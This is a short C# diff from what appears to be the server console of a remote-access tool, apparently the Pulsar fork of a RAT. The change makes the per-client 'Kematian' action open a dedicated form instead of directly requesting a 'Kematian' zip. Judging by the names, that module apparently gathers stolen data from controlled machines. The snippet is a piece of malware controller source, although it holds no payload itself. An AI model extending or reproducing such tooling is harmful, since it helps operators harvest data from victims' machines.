@@ -1331,8 +1331,10 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                var kematianHandler = new KematianHandler(c);
-                kematianHandler.RequestKematianZip();
+                var kematianHandler = new Messages.KematianHandler(c);
+                FrmKematian frmK = new FrmKematian(c, kematianHandler);
+                frmK.Show();
+                frmK.Focus();
             }
         }
 
